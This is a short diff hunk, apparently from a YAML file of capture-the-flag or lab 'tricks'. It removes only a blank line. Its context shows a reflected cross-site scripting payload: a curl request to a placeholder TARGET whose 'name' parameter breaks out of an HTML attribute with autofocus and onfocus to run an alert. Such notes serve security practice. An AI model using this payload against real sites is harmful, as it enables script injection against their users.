@@ -45,4 +45,3 @@ tricks:
     how: "GET request to /page with name parameter"
     payload: |
       curl "http://TARGET/page?name=%22%20autofocus%20onfocus=alert(String.fromCharCode(88,83,83))%20x=%22"
-
